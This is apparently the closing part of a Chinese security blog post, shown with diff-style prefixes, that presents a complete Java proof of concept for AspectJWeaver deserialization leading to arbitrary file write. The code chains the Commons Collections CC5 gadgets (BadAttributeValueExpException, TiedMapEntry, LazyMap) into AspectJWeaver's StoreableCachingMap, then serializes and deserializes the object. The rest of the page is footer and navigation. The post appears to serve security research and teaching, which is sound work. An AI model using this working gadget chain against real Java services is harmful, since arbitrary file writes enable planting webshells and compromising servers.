+<h1 id="CC5-AspectJWeaver-POC"><a href="#CC5-AspectJWeaver-POC" class="headerlink" title="CC5+AspectJWeaver POC"></a>CC5+AspectJWeaver POC</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.AspectJWeaverPOC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> SerializeChains.Gedget.Gadgets;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AspectJWeaver_CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取一个StoreableCachingMap实例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> c.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">storeableCachingMap</span> <span class="operator">=</span> (HashMap) ctor.newInstance(<span class="string">&quot;E:\\java\\JavaSec\\JavaSerialize&quot;</span>,<span class="number">1</span>);<span class="comment">//第一个是文件夹，第二个任意数字即可</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造文件内容通过 ConstantTransformer.transform返回</span></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;wanth3f1ag&quot;</span>.getBytes(StandardCharsets.UTF_8));<span class="comment">//由于文件内容value需要为字节数组，所以需要转化一下</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成LazyMap对象并传给TiedMapEntry</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(storeableCachingMap,constantTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC5的开头</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//BadAttributeValueExpException触发toString</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//反射修改val为tiedMapEntry</span></span><br><span class="line">        Gadgets.setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化和反序列化</span></span><br><span class="line">        Gadgets.serialize(badAttributeValueExpException,<span class="string">&quot;AspectJWeaver_CC5.txt&quot;</span>);</span><br><span class="line">        Gadgets.unserialize(<span class="string">&quot;AspectJWeaver_CC5.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<a target="_blank" rel="noopener" href="https://infernity.top/2025/03/24/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://infernity.top/2025/03/24/Aspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+
+    </div>
+
+    
+    
+    
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2026/02/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BAspectjweaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%87%B3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" title="Aspectjweaver反序列化至任意文件写入">https://wanth3f1ag.top/2026/02/28/Java反序列化之Aspectjweaver反序列化至任意文件写入/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/javasec/" rel="tag"># javasec</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/27/java%E4%B9%8BTomcat-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="Tomcat session反序列化漏洞">
+                  <i class="fa fa-angle-left"></i> Tomcat session反序列化漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/02/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BFastjson1.2.4x%E7%BB%95%E8%BF%87/" rel="next" title="Java反序列化之Fastjson1.2.4x绕过">
+                  Java反序列化之Fastjson1.2.4x绕过 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3.6m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">54:18</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
